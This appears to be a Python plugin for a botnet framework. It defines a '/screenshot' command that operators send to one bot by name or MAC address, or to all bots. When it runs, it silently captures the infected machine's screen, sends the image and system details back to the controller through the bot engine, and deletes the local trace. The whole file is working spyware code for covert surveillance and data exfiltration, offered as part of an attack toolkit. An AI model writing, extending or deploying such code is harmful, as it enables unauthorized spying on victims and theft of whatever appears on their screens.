import time
import os
from PIL import ImageGrab

from .. import BotNet, Context


@BotNet.default_script(script_version="0.0.1")
def screenshot(context: Context) -> str:
    """Get screen shot

    syntax:
        `[mac-address] /screenshot`
        or
        `[BOT-NAME] /screenshot`
        or
        `/screenshot`

    example command: 
        `94945035671481 /screenshot`
        or
        `/screenshot`

    return: img or img-download-link
    """

    file_name = f"{str(time.time()).replace('.', '_')}.png"

    try:
        with open(file_name, "wb") as file:
            screenshot = ImageGrab.grab()
            # Save the image to the file object as a PNG
            screenshot.save(file, "PNG")

        res = context.engine.send_file(file_name, additionalـinfo=context.system_info(minimal=True))
        if res:
            return None
        return "send screen-shot failed!, engine.send_file error"

    except OSError as e:
        return f"""screenshot - os error: {e}

        (error "X connection failed: error 5" it means os does not have any display for this user session.)"""

    except Exception as e:
        return f"get screen-shot failed: {e}"
        
    finally:
        if os.path.isfile(file_name):
            os.remove(file_name)

